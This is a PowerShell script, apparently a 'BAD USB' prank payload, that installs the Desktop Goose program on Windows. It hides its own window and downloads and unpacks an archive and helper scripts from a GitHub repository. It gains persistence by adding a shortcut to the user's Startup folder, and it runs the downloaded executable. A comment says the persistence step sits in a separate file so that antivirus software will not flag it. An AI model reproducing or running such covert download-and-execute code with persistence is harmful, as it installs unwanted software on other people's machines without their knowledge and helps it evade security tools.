# Hide the powershell window
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

# Find the folders
$startupFolder = "C:\Users\$Env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$saveFolder = "C:\Users\$Env:username\goose"

# Create the 'goose' folder
New-Item -Path $saveFolder -ItemType Directory

# Download and expand the Desktop Goose archive
Invoke-WebRequest "https://github.com/Jf0-2/Desktop-Goose-BAD-USB/raw/main/DesktopGoose.zip" -OutFile "$saveFolder\DesktopGoose.zip"
Expand-Archive -LiteralPath "$saveFolder\DesktopGoose.zip" -DestinationPath "$saveFolder\DesktopGoose"

# Delete the uneeded archive file
Remove-Item "$saveFolder\DesktopGoose.zip"

# Download the shortcut file (Not in this file because many antivirus' find it suspicious to download a file and put it in the startup folder)
Invoke-WebRequest "https://github.com/Jf0-2/Desktop-Goose-BAD-USB/raw/main/createShortcut.ps1" -OutFile "$saveFolder\createShortcut.ps1"

# Download the 'remove Goose' file (for ease of access since this is only supposed to be a prank)
Invoke-WebRequest "https://github.com/Jf0-2/Desktop-Goose-BAD-USB/raw/main/removeGoose.ps1" -OutFile "$saveFolder\removeGoose.ps1"

# Create the shortcut in the startup folder
Start-Process powershell "$saveFolder\createShortcut.ps1" *> "$saveFolder\createShortcutLog.txt"

# Open Desktop Goose
& "$saveFolder\DesktopGoose\GooseDesktop.exe"